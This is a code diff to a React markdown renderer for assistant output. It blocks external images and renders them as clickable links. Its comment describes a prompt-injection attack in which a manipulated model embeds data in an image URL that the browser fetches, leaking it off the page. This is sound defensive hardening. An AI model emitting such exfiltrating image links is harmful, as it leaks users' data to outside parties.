@@ -25,6 +25,13 @@ function FileLink({ href, children }) {
   )
 }
 
+function isLocalImage(src) {
+  if (typeof src !== "string" || !src) return false
+  if (src.startsWith("data:image/") || src.startsWith("blob:")) return true
+  // Root-relative only; "//host/x" is protocol-relative, i.e. another origin.
+  return src.startsWith("/") && !src.startsWith("//")
+}
+
 export function MarkdownText({ children }) {
   return (
     <ReactMarkdown
@@ -37,6 +44,24 @@ export function MarkdownText({ children }) {
             {children}
           </p>
         ),
+        // Assistant output is untrusted (it summarizes logs, tickets, web
+        // pages), and a browser fetches an <img> on sight: `![](http://x/?q=…)`
+        // would carry whatever the model was tricked into putting in the URL
+        // off the page. Only same-origin and inline images render; anything
+        // else becomes a plain link the operator has to click.
+        img: ({ src, alt }) =>
+          isLocalImage(src) ? (
+            <img src={src} alt={alt || ""} className="my-1 max-w-full rounded" />
+          ) : (
+            <a
+              href={src}
+              target="_blank"
+              rel="noreferrer"
+              className="text-primary underline underline-offset-2"
+            >
+              {alt || "外部图片"}（外链，未加载）
+            </a>
+          ),
         a: ({ children, href }) =>
           href && FILE_LINK.test(href) ? (
             <FileLink href={href}>{children}</FileLink>
